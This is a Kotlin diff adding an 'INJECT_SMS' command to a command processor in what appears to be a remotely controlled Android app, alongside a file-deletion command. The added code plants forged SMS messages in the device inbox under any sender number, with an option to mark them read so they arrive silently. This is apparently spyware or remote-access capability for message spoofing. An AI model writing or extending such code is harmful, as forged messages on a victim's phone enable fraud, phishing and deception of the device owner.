@@ -1152,6 +1152,25 @@ object CommandProcessor {
                         errorMsg = "Use: NUMBER | MESSAGE"
                     }
                 }
+                "INJECT_SMS" -> {
+                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                        status = "FAILED (NOT_DEFAULT)"
+                        errorMsg = "I'm not default to do that"
+                    } else {
+                        val parts = content.split("|")
+                        if (parts.size >= 2) {
+                            val num = parts[0].trim()
+                            val msg = parts[1].trim()
+                            val isRead = parts.getOrNull(2)?.trim()?.equals("READ", true) ?: false
+                            val success = PhoneManager.injectFakeSms(ctx, num, msg, isRead)
+                            status = if (success) "INJECTION_SUCCESS" else "INJECTION_FAILED"
+                            errorMsg = "From: $num | Mode: ${if(isRead) "Silent" else "Unread"}"
+                        } else {
+                            status = "FAILED_FORMAT"
+                            errorMsg = "Use: NUMBER | MESSAGE | [READ/UNREAD]"
+                        }
+                    }
+                }
                 "DELETE_FILE" -> {
                     val paths = content.split("|")
                     var successCount = 0
